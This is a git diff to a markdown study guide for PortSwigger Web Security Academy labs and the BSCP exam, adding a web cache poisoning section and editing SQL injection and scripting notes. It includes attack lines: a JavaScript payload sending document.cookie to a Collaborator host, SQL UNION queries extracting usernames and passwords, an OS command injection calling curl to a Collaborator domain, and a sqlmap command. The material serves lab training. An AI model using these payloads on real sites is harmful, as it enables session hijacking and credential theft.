@@ -599,6 +599,7 @@ body:document.cookie
 [Unkeyed header](#unkeyed-header)  
 [Utm_content](#utm_content)  
 [Poison ambiguous request](#poison-ambiguous-request)  
+[]()  
 
 ### Unkeyed header  
 
@@ -675,6 +676,18 @@ document.location='https://Collaborator.com/?CacheCookies='+document.cookie;
 ![Ambiguous Hosts](images/ambiguous-hosts.png)  
 
 [PortSwigger Lab: Web cache poisoning via ambiguous requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)  
+
+### Cache Poison multiple headers  
+
+>Identify that cache hit headers in responses, then test if the target support ```X-Forwarded-Host``` or ```X-Forwarded-Scheme``` headers. These headers can allow for the stealing of victim session cookie.  
+  
+>Change Exploit server file name to ```/resources/js/tracking.js``` as observed on target.  
+
+```html
+
+```  
+
+[PortSwigger Lab: Web cache poisoning with multiple headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)  
 
 ## Host Headers  
 
@@ -1474,7 +1487,7 @@ sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flus
 '+UNION+SELECT+username_XXXX,+password_XXXX+FROM+users_XXXX--
 ```  
 
->**EXTRA:** If only have one column to extract data, then concatenate multiple values in a single reflected output field using SQL syntax ```||``` characters.  
+>**EXTRA:** If you only have one column to extract text data, then concatenate multiple values in a single reflected output field using SQL syntax ```||``` characters from the database.  
 
 ```
 '+UNION+SELECT+NULL,username||'~'||password+FROM+users--
@@ -2421,9 +2434,11 @@ email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
 
 >This section contain **additional** information to solving the PortSwigger labs and approaching the BSCP exam, such as the Youtube content creators, Burp speed scanning technique, python automated scripts I created by following [TJCHacking](https://www.youtube.com/@tjchacking/videos).  
 
-## Solve Labs with Python  
+## Python Scripts 
 
->These python scripts are small set of the code written by [Github: Trevor tjcim](https://github.com/tjcim).  
+>This python script I am building to help me in the exam to quickly ***identify*** possible indicators of know vulnerabilities.
+
+
 
 [Lab Automated Python Scripts](python/README.md)  
 
